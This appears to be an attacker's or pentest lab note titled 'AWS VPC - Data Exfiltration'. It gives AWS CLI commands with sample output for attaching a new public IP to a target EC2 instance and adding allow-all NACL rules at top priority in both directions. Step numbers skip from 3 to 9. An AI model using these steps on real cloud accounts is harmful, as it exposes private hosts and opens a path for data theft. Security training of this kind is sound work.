AWS VPC - Data Exfiltration

1) Alocate new public IP address to the EC2 instance
Command CloudShell: aws ec2 allocate-address

Example output:
    "NetworkBorderGroup": "us-east-1",
    "Domain": "vpc",
    "PublicIp": "52.204.202.130"

2) Find the ENI (network interface) for the Target machine
Command CloudShell: aws ec2 describe-instances > instances.json
Command with grep: grep eni instances.json

Example Output:

                            "NetworkInterfaceId": "eni-0d66c30b373c693a8",

                            "NetworkInterfaceId": "eni-066e3faad2bef817e",

3) Attach the public IP to the ENI of the target machine, by associating the AllocationId with the NetworkInterfaceId.
Command: aws ec2 associate-address --network-interface-id eni-0d66c30b373c693a8 --allocation-id eipalloc-0742760cf386b1f93

Example Output:
{
    "AssociationId": "eipassoc-0989a693494b1f706"

Fix the NACLs to allow access

9) Describe NACLs 
Command: aws ec2 describe-network-acls > nacls.json

10) See and add another rule in the NACL list
The following command will create a new rule at the top of the evaluation list (--rule-number 1) to allow all traffic (--protocol -1) from anywhere(--cidr-block 0.0.0.0/0) to the Subnet.

Command: aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --ingress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0461eb33fd079a9b9
Note: the above command will not return any output.

11) Create an egress rule
Command: aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --egress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-0461eb33fd079a9b9
Note: the above command will not return any output.
